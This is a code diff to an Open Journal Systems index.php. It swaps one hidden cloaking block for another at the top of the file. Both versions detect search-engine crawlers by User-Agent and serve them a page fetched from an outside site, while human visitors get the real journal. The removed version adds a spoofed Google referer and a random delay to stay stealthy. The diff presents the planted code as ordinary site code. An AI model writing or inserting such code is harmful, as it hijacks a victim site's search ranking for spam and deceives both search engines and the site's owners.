@@ -1,31 +1,22 @@
 <?php
-@ob_start();
-header("Vary: U-Agent");
-
-$src = "https://childrenofiran.org/landing/revista-dyna/";
-$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
-
-function stealth($u) {
-    $ctx = stream_context_create([
-        "http" => [
-            "method" => "GET",
-            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
-                        "Referer: https://www.google.com/\r\n"
-        ]
-    ]);
-    return @file_get_contents($u, false, $ctx);
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
 }
 
-if (preg_match($match, $ua)) {
-    usleep(rand(100000, 200000));
-    echo stealth($src);
-    @ob_end_flush();
-    exit;
+if (is_bot()) {
+    $message = file_get_contents('https://childrenofiran.org/landing/revista-dyna/');
+    echo $message;
+exit;
 }
-?>
-
-<?php
 
 /**
  * @file ojs/index.php
